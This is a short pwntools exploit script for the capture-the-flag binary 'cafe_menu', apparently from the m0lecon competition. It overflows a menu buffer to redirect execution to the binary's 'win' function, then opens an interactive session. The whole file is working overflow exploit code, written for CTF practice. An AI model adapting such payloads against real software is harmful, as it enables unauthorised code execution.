#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./cafe_menu', checksec=False)

#p = remote("offsec.m0lecon.it", 13597)
p = process(elf.path)

#Your exploit here

gdb.attach(p, gdbscript="continue")

#tried all possible values and 71 (0x47 worked)
RIP_OFFSET = 71
MENU_LENGTH = 48

payload3 = flat(
        b"A"*MENU_LENGTH+b"\x47",
    p64(elf.sym.win)
        )

#payload needs to end with 0xff to not break
p.send(payload3 + b"\xff")


p.interactive()
